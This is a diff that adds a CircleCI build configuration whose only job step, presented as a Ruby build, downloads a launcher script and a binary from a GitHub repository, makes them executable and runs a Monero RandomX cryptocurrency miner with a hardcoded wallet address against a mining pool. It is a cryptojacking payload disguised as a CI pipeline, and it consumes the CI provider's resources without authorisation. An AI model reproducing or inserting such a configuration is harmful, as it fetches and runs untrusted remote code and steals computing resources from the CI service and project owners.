@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -49huw9izX2igS1LN13ZSKZ4Q2x4uM6oomahpAMhgvaUVTnkUSjeWCj6JJUcCP8RM1uhLXfKUBDs39F3FhpC5GqD93Nqrq38  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 gulf.moneroocean.stream:10128
